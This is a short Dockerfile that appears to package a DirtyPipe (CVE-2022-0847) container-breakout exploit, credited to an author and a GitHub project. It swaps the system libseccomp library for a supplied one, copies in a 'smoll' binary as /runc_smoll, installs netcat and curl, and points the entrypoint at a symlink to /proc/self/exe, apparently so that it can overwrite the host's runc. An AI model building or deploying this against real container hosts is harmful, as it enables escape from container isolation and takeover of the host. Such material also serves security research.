#
# DirtyPipe container breakout
# https://github.com/jpts/CVE-2022-0847-DirtyPipe-Container-Breakout/
# Author: jpts
#

FROM debian:bookworm-slim

RUN apt update && apt install -y procps iproute2 netcat-openbsd curl

WORKDIR /usr/lib/x86_64-linux-gnu/
RUN rm -f libseccomp.so.2

COPY libseccomp.so /usr/lib/x86_64-linux-gnu/libseccomp.so.2

COPY smoll /runc_smoll

RUN ln -s /proc/self/exe /init

WORKDIR /
ENTRYPOINT ["/init", "--version"]
